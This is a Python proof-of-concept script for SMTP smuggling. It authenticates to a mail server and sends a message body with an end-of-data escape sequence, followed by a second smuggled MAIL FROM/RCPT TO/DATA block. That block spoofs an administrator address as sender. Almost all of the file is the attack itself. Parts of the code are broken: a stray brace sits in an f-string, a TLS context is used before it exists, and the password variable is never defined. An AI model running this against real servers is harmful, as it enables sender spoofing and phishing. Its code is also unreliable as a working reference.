#!/bin/python3

#
#
# SMTP_SMUGGLER_POC Checker v0.1 
# All rights reserved - (c) 2024 - suuhm
#
# ---------------------------------------
#

import socket
import ssl
import base64
import argparse
import getpass
import time
import smtplib


#
# GLOBASL VARS AND SETTINGS:
# --------------------------
email_subject = 'Subject: Your Subject'
email_body_one = 'Here is the text of your email.'
admin_from = 'admin@gmail.com'
end_of_data_command = '\r\n.\r\n'

#Smgggling Strings:
smtp_smuggle_escape = '\r\n.\n'
#smtp_smuggle_escape = '\r\n.'

# -------------------------------------------------



def send_smtp_command(command, sock):
    sock.send((command + '\r\n').encode('utf-8'))
    time.sleep(2)
    response = sock.recv(1024).decode('utf-8')
    print(response)
    return response



def resolve_domainname(server):
    try:
        domain_name = server
        info = socket.getaddrinfo(domain_name, None)
        server = info[0][4][0]
        print(f'Try to resolve {domain_name} to ip: {server}')
    except socket.gaierror as e:
        print(f'Error by domain resolve: {domain_name}: {e}')



def send_socket_raw_mail(server,port,username,password,rcpt):

    with socket.create_connection((server, port)) as sock:
        # SSL/TLS-Handshake
        #context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        #context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        #context.minimum_version = ssl.TLSVersion.TLSv1_2
        #context.maximum_version = ssl.TLSVersion.TLSv1_2
        #context.check_hostname = False

        #context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        #context.set_ciphers(DEFAULT_CIPHERS)
        #sock = context.wrap_socket(sock, server_hostname=server)

        print('[:D] EHLO-Begrüßung')
        ehlo_command = f'EHLO testsmtp.{server}'
        print(f'Sen command {ehlo_command}')
        send_smtp_command(ehlo_command, sock)
        #time.sleep(2.7)

        if port == 587:
            print('STARTTLS-Handshake initiieren bei port 25 only?')
            starttls_command = 'STARTTLS'
            send_smtp_command(starttls_command, sock)

            sock = context.wrap_socket(sock, server_hostname=server)
            time.sleep(1.4)

            # TLS-Handshake durchführen
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=server)

            print(f'[*] Authentifiziere dich mit {username} und {password} AUTH PLAIN')
            auth_data = "\0{}\0{}".format(username, password)
            auth_command = 'AUTH PLAIN {}'.format(base64.b64encode(auth_data.encode()).decode())
            print(auth_command)
            send_smtp_command(auth_command, sock)
            time.sleep(1.4)
        else:
            print(f'[*] Authentifiziere dich mit ta-LOGIN {username} und {password} AUTH LOGIN')
            auth_data = "\0{}\0{}".format(username, password)
            auth_command = 'AUTH LOGIN {}'.format(base64.b64encode(auth_data.encode()).decode())
            print(auth_command)
            send_smtp_command(auth_command, sock)
            time.sleep(1.4)

        print('[*] Mail senden..')
        mail_from_command = f'MAIL FROM: {username}'
        send_smtp_command(mail_from_command, sock)
        time.sleep(1.4)

        rcpt_to_command = f'RCPT TO: {rcpt}'
        send_smtp_command(rcpt_to_command, sock)
        time.sleep(1.4)

        data_command = 'DATA'
        send_smtp_command(data_command, sock)


        # Manuell eingegebene Daten für den E-Mail-Text
        #manual_input = f'{email_subject}\r\n{email_body}\r\n{end_of_data_command}'
        manual_input = f'''Subject: {email_subject}\r\n
                           From: {username}\r\n
                           To: {rcpt}\r\n
                           {email_body_one}
                           {smtp_smuggle_escape}
                           mail From: {admin_from}}\r\n
                           rcpt To: {rcpt}\r\n
                           data\r\n
                           Subject: Hello my admin\r\n
                           f'From: admin <{admin_from}>\r\n
                           To: kaz <{rcpt}>\r\n
                           hello got my foo
                           {end_of_data_command}
                           '''

        send_smtp_command(manual_input, sock)

        # QUIT-Befehl zum Beenden der Sitzung
        quit_command = 'QUIT'
        send_smtp_command(quit_command, sock)




def send_mail(smtp_server, port, username, password, rcpt, sdebug=True):

    # TLS-Kontext erstellen
    context = ssl.create_default_context()

    # Verbindung zum SMTP-Server herstellen
    with smtplib.SMTP(smtp_server, port) as server:

        #Debugging
        if sdebug == True:
            server.set_debuglevel(2)
        else:
            server.set_debuglevel(0)


        # Starte TLS
        server.starttls(context=context)

        # EHLO senden
        server.ehlo()

        # Authentifiziere dich mit AUTH PLAIN
        print(f'[*] Authentifiziere dich mit {username} und {password} AUTH PLAIN')
        auth_plain = base64.b64encode(f'\0{username}\0{password}'.encode()).decode()
        try:
            server.docmd('AUTH', 'PLAIN ' + auth_plain)
        except Exception as e:
            print(f"login failed:: {e}")


        # Sende die E-Mail
        print('[*] Mail senden..')
        #mail_from_command = f'MAIL FROM: {username}'
        server.mail(username)

        #rcpt_to_command = f'RCPT TO: {rcpt}'
        server.rcpt(rcpt)

        data_command = 'DATA'
        
        

        #manual_input = f'{email_subject}\r\n{email_body}\r\n{end_of_data_command}'
        manual_input = (
                        'DATA\r\n' +
                        f'From: Me <{username}>\r\n' +
                        f'To: You <{rcpt}>\r\n' +
                        f'Subject: {email_subject}\r\n' +
                        email_body_one +
                        smtp_smuggle_escape +
                        f'mail From: {admin_from}\r\n' +
                        f'rcpt To: {rcpt}\r\n' +
                        'data\r\n' +
                        f'From: admin <{admin_from}>\r\n' +
                        f'To: kaz <{rcpt}>\r\n' +
                        'Subject: Hello my admin\r\n' +
                        'hello got my foo'
                        )

        bytes_input = manual_input.encode('utf-8')
        #server.sendmail(mail_from_command, rcpt_to_command, bytes_input)
        server.send(manual_input)
        server.quit()



def main():

    # Server und Port des Postfix-Servers
    #sserver = '127.0.0.1'
    sserver = 'mail.servername.com'
    sport = 25
    #sport = 587

    susername = 'info@sevename.com'
    spassword = 'pass556g$$$'
    srcpt = 'test@test.com'

    # Kommandozeilenargumente verarbeiten
    parser = argparse.ArgumentParser(description='Send mail with TLS und AUTH PLAIN.')
    parser.add_argument('--server', type=str, default=sserver, help='SMTP-Servername')
    parser.add_argument('--port', type=int, default=sport, help='SMTP-Serverport')
    parser.add_argument('--user', type=str, default=susername, help='SMTP-userername')
    parser.add_argument('--rcpt', type=str, default=srcpt, help='Empfängeradresse')
    args = parser.parse_args()

    # Passwort abfragen
    #password = getpass.getpass(prompt='Passwort: ')
    #password = spassword

    server = args.server
    port = args.port
    username = args.user
    rcpt = args.rcpt

    #resolve_domainname(server)

    try:
        send_mail(server,port,username,password,rcpt)
        print('E-Mail wurde erfolgreich gesendet.')

    except Exception as e:
        print(f"Fehler beim Senden der E-Mail: {e}")



if __name__ == "__main__":
    main()